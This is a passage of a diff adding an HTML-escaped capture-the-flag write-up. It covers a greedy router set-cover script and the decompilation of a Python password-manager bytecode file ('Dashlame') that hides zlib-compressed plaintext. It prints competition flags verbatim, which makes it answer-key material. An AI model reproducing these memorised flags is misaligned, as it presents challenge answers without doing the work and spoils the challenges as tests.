+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_best_router_of_line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;router_occurences&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;routers_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;best_router&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'router'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;router&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;routers_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;router_occurences&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;router&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;best_router&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;best_router&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;router&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;router_occurences&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;router&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;best_router&lt;/span&gt;
+
+
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;__main__&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;solution&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;is_covered&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;unique_routers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_unique_routers_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;router_occurences&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count_router_occurences&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unique_routers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;c&quot;&gt;#init is_covered&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10001&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;is_covered&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;
+
+
+    &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'routes.txt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'r'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;lines&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readlines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;finished&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;is_covered&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;splitted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;','&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is_covered&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;
+                    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;solution_covers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;solution&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+                        &lt;span class=&quot;n&quot;&gt;is_covered&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
+                    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+                        &lt;span class=&quot;n&quot;&gt;best_score_of_line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_best_router_of_line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;dict&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;router_occurences&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;splitted&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Adding '&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;best_score_of_line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;' for line: '&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+                        &lt;span class=&quot;n&quot;&gt;solution&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;best_score_of_line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+                        &lt;span class=&quot;n&quot;&gt;is_covered&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Solution size: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;solution&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;router&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;solution&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;router&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;The first flag is INSA{N0t_bad_f0r_a_start}. The next flag will be awarded at &amp;lt;= 135.&lt;/code&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;part-02&quot;&gt;Part 02&lt;/h3&gt;
+
+&lt;p&gt;The second flag required a solution containing at most 135 routers. In order to get the 4 flags, I had to completely change of strategy but I hadn’t so much time left and wanted to work on other challenges so I did something very dirty.&lt;/p&gt;
+
+&lt;p&gt;Pre-filling my solution array with certain routers would sometimes give better solutions than my previous script. Guess what, I did that until having a 135 routers solution. Pretty lame I agree…&lt;/p&gt;
+
+&lt;p&gt;Here is the modification I brought to script of part 1:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;BEFORE:
+solution = []
+
+AFTER:
+solution = ['100284b7','57e483e5','326ceb8a','9793198c','5cc167e0','85ea0d43']
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And here I am with my 135 routers solution!&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;INSA{135_is_pretty_g0Od_but_how_l0w_c4n_u_gO}. Get your next flag at &amp;lt;= 128&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;reverse-dashlame&quot;&gt;[Reverse] Dashlame&lt;/h2&gt;
+
+&lt;h3 id=&quot;statement-3&quot;&gt;Statement&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Can you try our new &lt;a href=&quot;http://localhost:4000/assets/2019-05-08/dashlame.pyc&quot; title=&quot;Password manager&quot;&gt;password manager&lt;/a&gt; ? There’s a free flag in every password archive created !&lt;/p&gt;
+
+  &lt;p&gt;This challenge contains a second part in the Crypto category.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;uncompyle&quot;&gt;Uncompyle&lt;/h3&gt;
+
+&lt;p&gt;As indicated by &lt;code class=&quot;highlighter-rouge&quot;&gt;file&lt;/code&gt;, the given file is actually some compiled python bytecode.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file dashlame.pyc
+dashlame.pyc: python 2.7 byte-compiled
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Luckily, it is trivial to recover the source code from python bytecode. I used &lt;code class=&quot;highlighter-rouge&quot;&gt;uncompyle&lt;/code&gt; for this:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;uncompyle2 &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; dashlame.py dashlame.pyc
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file dashlame.py
+dashlame.py: Python script, ASCII text executable, with very long lines
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;understanding-the-script&quot;&gt;Understanding the script&lt;/h3&gt;
+
+&lt;p&gt;The &lt;a href=&quot;http://localhost:4000/assets/2019-05-08/dashlame.py&quot; title=&quot;Password manager&quot;&gt;script&lt;/a&gt; defines the following functions:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;def dashlame.py
+def pad&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
+def unpad&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
+def get_random_passphrase&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;:
+def get_pearson_hash&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;passphrase&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
+def encrypt_stream&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;data, passphrase&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
+def decrypt_stream&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;data, passphrase&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
+def encrypt_archive&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;archive_filename, passphraseA, passphraseB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
+def decrypt_archive&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;archive_filename, passphraseA, passphraseB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
+def createArchive&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;:
+def updateArchive&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;:
+def accessArchive&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;:
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We see nothing strange for a password manager. Let’s dig into the &lt;code class=&quot;highlighter-rouge&quot;&gt;createArchive()&lt;/code&gt; function since the challenge statement mentions &lt;em&gt;a flag in every password archive created&lt;/em&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;createArchive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;archive_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;raw_input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Please enter your archive name: '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;passphraseA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passphraseB&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_random_passphrase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'This is your passphrase :'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passphraseA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passphraseB&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Please remember it or you will lose all your passwords.'&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;archive_filename&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;archive_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'.db'&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;archive_filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'wb'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;db_fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;db_fd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zlib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decompress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'x&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x9c\x0b\x0e\xf4\xc9&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;,IUH&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xcb&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xca&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;M,Q0f`a`ddpPP````&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x82&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x18&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x04&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x16&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;4&amp;gt;!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xc0\xc4\xa0\xfb\x8c\x9b\x17\xa4\x98&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;y.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x03\x10\x8d\x82&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Q0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\x88\x05\x89\x8c\xec\xe2\xf2\xf2\x8c\x8d\x82&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x89&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;I9&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xa9\x01\x89\xc5\xc5\xe5\xf9&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;E)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xc5&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x06\x93&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90\xab&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x88\xab&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;B&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x88\xa3\x93\x8f\xab\x02\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;X&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xa3&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;lt;5&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xa9\x18\x94\xab&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;C&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;#Bt&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x14&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;J&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x8b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;S&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x8b\xf2\x12&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;sa&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xdc\x02\xa8&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;20W&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x13\x92&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xcf&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00\xd1&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x18\x05\xa3&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x08\x03&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;#F&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x16&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;mYkh&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xe6\x8f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;O&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xad&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;H&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xcc&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xc8&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;I&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x85\xe5&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;~O&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xbf&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xc7\xea\x90\xcc\xe2\xf8\xa4\xd0\x92\xf8\xc4\xf8&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xe7&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x93\x92\xe4\x8c&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Z&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00\xa8&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;amp;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x8f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;encrypt_archive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;archive_filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passphraseA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passphraseB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Archive created successfully.'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We can see the content of the password archive stored unencrypted inside the script.&lt;/p&gt;
+
+&lt;h3 id=&quot;resolution-2&quot;&gt;Resolution&lt;/h3&gt;
+
+&lt;p&gt;Since the archive content is written in zlib-compressed plaintext inside the script, we can simply decompress it and print the output in order to get the content of the password archive.&lt;/p&gt;
+
